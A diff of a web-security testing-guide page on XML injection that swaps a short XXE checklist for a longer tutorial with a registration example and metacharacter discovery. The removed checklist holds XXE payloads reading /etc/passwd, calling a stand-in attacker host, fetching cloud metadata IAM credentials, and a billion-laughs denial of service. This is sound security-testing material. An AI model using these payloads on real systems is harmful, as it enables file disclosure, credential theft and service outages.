@@ -1,70 +1,108 @@
-WSTG-INPV-07: Testing for XML Injection / XML External Entity (XXE)
+WSTG-INPV-07: Testing for XML Injection
 
-Summary:
-XML injection occurs when user data is embedded in XML without proper encoding, allowing manipulation of the XML structure. XXE is a specific form where DOCTYPE declarations reference external entities, causing the parser to fetch and embed external resources. XXE can lead to local file disclosure, SSRF, and denial of service.
+## Summary
+XML Injection testing is when a tester tries to inject an XML document into the application. If the XML parser fails to contextually validate data, then the test will yield a positive result.
 
-Test Objectives:
-- Identify application endpoints that parse user-supplied XML
-- Test whether the XML parser processes DOCTYPE declarations and external entities
-- Assess accessible internal resources and files
+This section describes practical examples of XML Injection. First, an XML style communication will be defined and its working principles explained. Then, the discovery method in which we try to insert XML metacharacters. Once the first step is accomplished, the tester will have some information about the XML structure, so it will be possible to try to inject XML data and tags (tag injection).
 
-How to Test:
+## Test Objectives
+- Identify XML injection points.
+- Assess the types of exploits that can be attained and their severities.
 
-1. Identify XML Processing Points
-   - Endpoints accepting Content-Type: application/xml or text/xml
-   - SOAP web services
-   - File upload endpoints accepting XML, SVG, DOCX, XLSX (all ZIP-based XML formats)
-   - REST endpoints accepting JSON that may internally convert to XML
-   - Configuration import/export features
+## How to Test
+Let's suppose there is a web application using an XML style communication in order to perform user registration. This is done by creating and adding a new `<user>`node in an `xmlDb` file.
 
-2. Basic XXE Test - File Disclosure
-   Submit this payload in any XML parameter:
-   ```xml
-   <?xml version="1.0"?>
-   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-   <foo>&xxe;</foo>
-   ```
-   If /etc/passwd contents appear in the response, XXE is confirmed.
+Let's suppose the xmlDB file is like the following:
 
-3. Blind XXE - Out-of-Band (OOB) Detection
-   For applications that don't reflect entity values:
-   ```xml
-   <?xml version="1.0"?>
-   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker-collaborator.com/xxe">]>
-   <foo>&xxe;</foo>
-   ```
-   Monitor for outbound HTTP requests to confirm the parser fetches external URLs.
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<users>
+    <user>
+        <username>gandalf</username>
+        <password>!c3</password>
+        <userid>0</userid>
+        <mail>gandalf@middleearth.com</mail>
+    </user>
+    <user>
+        <username>Stefan0</username>
+        <password>w1s3c</password>
+        <userid>500</userid>
+        <mail>Stefan0@whysec.hmm</mail>
+    </user>
+</users>
+```
 
-4. XXE via SSRF
-   ```xml
-   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
-   ```
-   Access cloud metadata endpoints to retrieve IAM credentials.
+When a user registers himself by filling an HTML form, the application receives the user's data in a standard request, which, for the sake of simplicity, will be supposed to be sent as a `GET` request.
 
-5. Denial of Service - Billion Laughs
-   ```xml
-   <?xml version="1.0"?>
-   <!DOCTYPE lolz [
-     <!ENTITY lol "lol">
-     <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
-     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
-   ]>
-   <lolz>&lol3;</lolz>
-   ```
+For example, the following values:
 
-6. SVG and DOCX Upload Testing
-   - Create a malformed SVG with embedded XXE payload
-   - Upload to avatar, image, or document import endpoints
-   - Observe server response for file content or timing differences
+```txt
+Username: tony
+Password: Un6R34kb!e
+E-mail: s4tan@hell.com
+```
 
-Tools:
-   - Burp Suite Collaborator: OOB XXE detection
-   - XXEinjector: automated XXE exploitation tool
-   - Custom Burp extensions for XXE scanning
+will produce the request:
 
-Expected Secure Behavior (Pass Conditions):
-- XML parser has DOCTYPE processing disabled (disallow-doctype-decl feature enabled)
-- External entity processing disabled for all XML parsers
-- User-supplied XML parsed in a restricted environment without network access
-- Application returns generic errors without revealing XML parser details
-- SVG and XML file uploads are validated and processed with secure parser configuration
+`https://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`
+
+The application, then, builds the following node:
+
+```xml
+<user>
+    <username>tony</username>
+    <password>Un6R34kb!e</password>
+    <userid>500</userid>
+    <mail>s4tan@hell.com</mail>
+</user>
+```
+
+which will be added to the xmlDB:
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<users>
+    <user>
+        <username>gandalf</username>
+        <password>!c3</password>
+        <userid>0</userid>
+        <mail>gandalf@middleearth.com</mail>
+    </user>
+    <user>
+        <username>Stefan0</username>
+        <password>w1s3c</password>
+        <userid>500</userid>
+        <mail>Stefan0@whysec.hmm</mail>
+    </user>
+    <user>
+    <username>tony</username>
+    <password>Un6R34kb!e</password>
+    <userid>500</userid>
+    <mail>s4tan@hell.com</mail>
+    </user>
+</users>
+```
+
+### Discovery
+
+The first step in order to test an application for the presence of a XML Injection vulnerability consists of trying to insert XML metacharacters.
+
+XML metacharacters are:
+
+- Single quote: `'` - When not sanitized, this character could throw an exception during XML parsing, if the injected value is going to be part of an attribute value in a tag.
+
+As an example, let's suppose there is the following attribute:
+
+`<node attrib='$inputValue'/>`
+
+So, if:
+
+`inputValue = foo'`
+
+is instantiated and then is inserted as the attrib value:
+
+`<node attrib='foo''/>`
+
+then, the resulting XML document is not well formed.
+
+[...truncated]
